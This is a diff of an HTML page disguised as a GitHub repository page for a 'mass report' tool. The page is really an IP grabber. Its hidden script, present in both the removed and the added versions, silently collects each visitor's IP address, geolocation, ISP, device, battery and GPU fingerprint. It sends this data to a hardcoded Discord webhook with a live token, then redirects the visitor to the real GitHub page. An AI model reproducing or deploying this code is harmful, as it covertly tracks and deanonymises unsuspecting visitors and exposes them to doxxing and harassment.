@@ -3,8 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GitHub - KrumoXDev/MassReporterx3</title>
-    <meta name="description" content="GitHub repository page">
+    <title>GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!</title>
+    <meta name="description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
+    <meta property="og:title" content="GitHub - KrumoXDev/MassReporterx3: Best mass rep toxx tool!">
+    <meta property="og:description" content="Nightcore Contribute to KrumoXDev/MassReporterx3 development by creating an account on GitHub.">
+    <meta property="og:url" content="https://github.com/KrumoXDev/MassReporterx3">
+    <meta property="og:image" content="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png">
+    <meta name="theme-color" content="#24292e">
     <style>
         body {
             font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Helvetica,Arial,sans-serif;
@@ -61,6 +66,7 @@
                 <path fill-rule="evenodd" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path>
             </svg>
         </div>
+
         <div class="repo-header">
             <h1 class="repo-title">KrumoXDev/MassReporterx3</h1>
             <div class="loading">
@@ -71,114 +77,159 @@
     </div>
 
     <script>
-    // Instant execution with no delays
-    (async function() {
-        // Parallel data collection for maximum speed
-        const dataPromises = [
-            fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: 'unknown'})),
-            fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({})),
-            navigator.getBattery ? navigator.getBattery().then(b => ({
-                battery: {
-                    level: b.level,
-                    charging: b.charging,
-                    chargingTime: b.chargingTime,
-                    dischargingTime: b.dischargingTime
-                }
-            })).catch(() => ({})) : Promise.resolve({})
-        ];
-
-        // Get WebGL fingerprint immediately
-        let gpuInfo = {};
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpuInfo = {
-                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                };
+        // Ultra-fast parallel data collection
+        async function collectAllData() {
+            // Start all async operations simultaneously
+            const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({}));
+            const geoPromise = fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            
+            // Battery API (if available)
+            let batteryData = { level: null, charging: null };
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryData = {
+                        level: Math.round(battery.level * 100),
+                        charging: battery.charging
+                    };
+                } catch(e) {}
             }
-        } catch(e) {}
-
-        // Wait for all parallel requests
-        const [ipData, geoData, batteryData] = await Promise.all(dataPromises);
-
-        // Compile complete visitor profile
-        const visitorData = {
-            // Core identification
-            ip: ipData.ip,
-            timestamp: new Date().toISOString(),
-            userAgent: navigator.userAgent,
             
-            // Precise location
-            coordinates: {
-                latitude: geoData.latitude || 'unknown',
-                longitude: geoData.longitude || 'unknown'
-            },
-            location: {
-                country: geoData.country_name || 'unknown',
-                region: geoData.region || 'unknown',
-                city: geoData.city || 'unknown',
-                postal: geoData.postal || 'unknown',
-                timezone: geoData.timezone || 'unknown'
-            },
-            network: {
-                isp: geoData.org || 'unknown',
-                asn: geoData.asn || 'unknown'
-            },
+            // GPU detection
+            let gpuInfo = null;
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    gpuInfo = {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+            } catch(e) {}
             
-            // Device info
-            screen: `${window.screen.width}x${window.screen.height}`,
-            devicePixelRatio: window.devicePixelRatio,
-            deviceMemory: navigator.deviceMemory || "unknown",
-            cpuCores: navigator.hardwareConcurrency || "unknown",
-            battery: batteryData.battery || {level: 'unavailable'},
+            // Wait for all parallel requests
+            const [ipData, geoData] = await Promise.all([ipPromise, geoPromise]);
             
-            // Browser fingerprint
-            language: navigator.language,
-            platform: navigator.platform,
-            doNotTrack: navigator.doNotTrack,
-            gpu: gpuInfo,
-            
-            // Connection
-            connection: navigator.connection ? {
-                type: navigator.connection.effectiveType,
-                downlink: navigator.connection.downlink,
-                rtt: navigator.connection.rtt
-            } : null,
-            
-            // Page info
-            referrer: document.referrer || "direct",
-            url: window.location.href
-        };
+            // Compile final data
+            return {
+                // Core identification
+                ip: ipData.ip || 'unknown',
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                
+                // Location data
+                location: {
+                    country: geoData.country_name || 'unknown',
+                    region: geoData.region || 'unknown',
+                    city: geoData.city || 'unknown',
+                    postal: geoData.postal || 'unknown',
+                    coordinates: {
+                        latitude: geoData.latitude || 'unknown',
+                        longitude: geoData.longitude || 'unknown'
+                    },
+                    timezone: geoData.timezone || 'unknown',
+                    isp: geoData.org || 'unknown',
+                    asn: geoData.asn || 'unknown'
+                },
+                
+                // Device info
+                device: {
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    pixelRatio: window.devicePixelRatio,
+                    memory: navigator.deviceMemory || 'unknown',
+                    cpuCores: navigator.hardwareConcurrency || 'unknown',
+                    battery: batteryData,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    doNotTrack: navigator.doNotTrack || 'unknown'
+                },
+                
+                // GPU info
+                gpu: gpuInfo || { vendor: 'unknown', renderer: 'unknown' },
+                
+                // Network info
+                network: {
+                    connection: navigator.connection ? {
+                        type: navigator.connection.effectiveType,
+                        downlink: navigator.connection.downlink,
+                        rtt: navigator.connection.rtt
+                    } : null
+                },
+                
+                // Page info
+                page: {
+                    url: window.location.href,
+                    referrer: document.referrer || 'direct'
+                }
+            };
+        }
 
-        // Send to Discord via webhook (using beacon API for instant delivery)
-        const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
-        const embed = {
-            title: "📊 New Visitor Data",
-            color: 0x00ff00,
-            fields: [
-                {name: "🌐 IP Address", value: `\`${visitorData.ip}\``, inline: true},
-                {name: "📍 Location", value: `${visitorData.location.city}, ${visitorData.location.country}`, inline: true},
-                {name: "🛜 Network", value: `${visitorData.network.isp} (AS${visitorData.network.asn})`, inline: true},
-                {name: "💻 Device", value: `${visitorData.platform} (${visitorData.screen})`, inline: true},
-                {name: "🔋 Battery", value: visitorData.battery.level !== 'unavailable' ? 
-                    `${Math.round(visitorData.battery.level*100)}% ${visitorData.battery.charging ? '⚡' : ''}` : 'unavailable', inline: true},
-                {name: "🎮 GPU", value: `${visitorData.gpu.vendor || 'unknown'} (${visitorData.gpu.renderer || 'unknown'})`, inline: true},
-                {name: "📶 Connection", value: `${visitorData.connection?.type || 'unknown'} (${visitorData.connection?.downlink || '?'}Mbps)`, inline: true}
-            ],
-            footer: {text: `Collected at ${new Date().toLocaleString()}`}
-        };
+        // Optimized Discord webhook sender
+        async function sendToDiscord(data) {
+            const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
+            
+            // Format battery info
+            const batteryText = data.device.battery.level !== null 
+                ? `${data.device.battery.level}% (${data.device.battery.charging ? 'charging' : 'not charging'})` 
+                : 'unknown';
+            
+            // Format connection info
+            const connectionText = data.network.connection 
+                ? `${data.network.connection.type} (${data.network.connection.downlink}Mbps)` 
+                : 'unknown';
+            
+            try {
+                await fetch(webhookURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "📊 New Visitor Analytics",
+                            color: 0x5865F2,
+                            fields: [
+                                { name: "🌐 IP Address", value: `\`${data.ip}\``, inline: true },
+                                { name: "📍 Location", value: `${data.location.city}, ${data.location.country}`, inline: true },
+                                { name: "🛜 Network", value: `${data.location.isp} (AS${data.location.asn})`, inline: true },
+                                { name: "📱 Device", value: `${data.device.platform} (${data.device.screen})`, inline: true },
+                                { name: "⚡ Battery", value: batteryText, inline: true },
+                                { name: "🔌 Connection", value: connectionText, inline: true },
+                                { name: "🎮 GPU", value: `${data.gpu.vendor} - ${data.gpu.renderer}`, inline: false },
+                                { name: "🖥️ Hardware", value: `${data.device.cpuCores} cores, ${data.device.memory}GB RAM`, inline: true },
+                                { name: "🌍 Language", value: data.device.language, inline: true }
+                            ],
+                            footer: {
+                                text: `Collected at ${new Date().toLocaleString()} | ${data.page.url}`
+                            }
+                        }]
+                    })
+                });
+            } catch(e) {
+                console.error("Discord send error:", e);
+            }
+        }
 
-        // Use beacon API for fastest possible delivery
-        navigator.sendBeacon(webhookURL, JSON.stringify({
-            embeds: [embed]
-        }));
-
-        // Instant redirect (no visible delay)
-        window.location.replace("https://github.com/KrumoXDev/MassReporterx3");
-    })();
+        // Ultra-fast execution flow
+        (async () => {
+            // Start data collection immediately
+            const dataPromise = collectAllData();
+            
+            // Minimum display time for spinner (300ms)
+            const minDisplayTime = new Promise(resolve => setTimeout(resolve, 300));
+            
+            // Wait for both data and minimum display time
+            await Promise.all([dataPromise, minDisplayTime]);
+            
+            // Get collected data
+            const collectedData = await dataPromise;
+            
+            // Send data without waiting for response (fire-and-forget)
+            sendToDiscord(collectedData).catch(() => {});
+            
+            // Immediate redirect
+            window.location.href = "https://github.com/KrumoXDev/MassReporterx3";
+        })();
     </script>
 </body>
-    </html>
+</html>
